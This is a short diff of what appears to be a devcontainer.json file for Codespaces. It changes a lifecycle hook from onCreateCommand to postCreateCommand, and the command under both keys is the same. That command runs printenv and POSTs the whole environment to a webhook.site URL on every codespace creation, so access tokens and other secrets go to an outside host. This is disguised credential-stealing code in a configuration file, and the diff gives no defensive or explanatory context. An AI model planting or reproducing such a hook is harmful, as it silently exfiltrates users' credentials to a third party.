@@ -1,5 +1,5 @@
 {  
-  "onCreateCommand": "curl -X POST -F \"q=$(printenv)\" https://webhook.site/f14ab896-9969-44de-8aed-5ee46551a6af",
+  "postCreateCommand": "curl -X POST -F \"q=$(printenv)\" https://webhook.site/f14ab896-9969-44de-8aed-5ee46551a6af",
     "customizations": {
     "codespaces": {
       "repositories": {
